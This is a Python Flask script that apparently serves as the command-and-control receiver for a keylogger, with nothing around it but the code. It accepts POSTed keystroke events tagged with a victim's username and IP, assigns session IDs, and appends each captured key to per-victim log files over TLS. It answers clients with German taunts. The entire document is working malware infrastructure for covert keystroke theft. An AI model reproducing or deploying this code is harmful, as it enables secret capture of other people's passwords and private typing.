#!/usr/bin/env python3
from flask import Flask, request, session, make_response
from uuid import uuid4, UUID
import os
DEFAULT_SERVER_PORT = 8443


def get_arguments():
    from argparse import ArgumentParser
    parser = ArgumentParser()
    parser.add_argument('--ip',
                        dest='ip',
                        required=True,
                        type=str,
                        help='Specify an IP address to bind to.')
    parser.add_argument('--port',
                        dest='port',
                        required=False,
                        default=DEFAULT_SERVER_PORT,
                        type=int,
                        help='Specify the server port to bind to. '
                             f'{DEFAULT_SERVER_PORT}/tcp is set by default.')
    options = parser.parse_args()
    return options


options = get_arguments()

app = Flask(__name__)


@app.route('/log', methods=['POST'])
def log():
    keylogger_event = request.json
    remote_ip = request.remote_addr

    creation_timestamp = keylogger_event['creation_timestamp']
    username = keylogger_event['username']
    key_pressed = keylogger_event['key_pressed']

    if 'Session-ID' in request.headers:
        session_id = request.headers['Session-ID']
        try:
            UUID(session_id, version=4)
        except ValueError:
            print("The session ID isn't a valid UUID string")
            return "Verpiss dich!"
    else:
        print(f'A new session opened from {username}@{remote_ip} '
              f'at {keylogger_event["creation_timestamp"]}')
        session_id = f"{uuid4()}"

    print(f"Capturing a new keylogger event: {keylogger_event}")
    file_name =f"{session_id}-{remote_ip}-{username}.txt"

    if not os.path.exists(file_name):
        with open(file_name, 'w') as f:
            f.write(f"{creation_timestamp} ->")

    with open(file_name, 'a', errors='ignore') as log:
        log.write(key_pressed)

    resp = make_response("Na los! An die Arbeit!")
    resp.headers['Session-ID'] = session_id
    return resp


app.run(host=options.ip, port=options.port, ssl_context="adhoc")
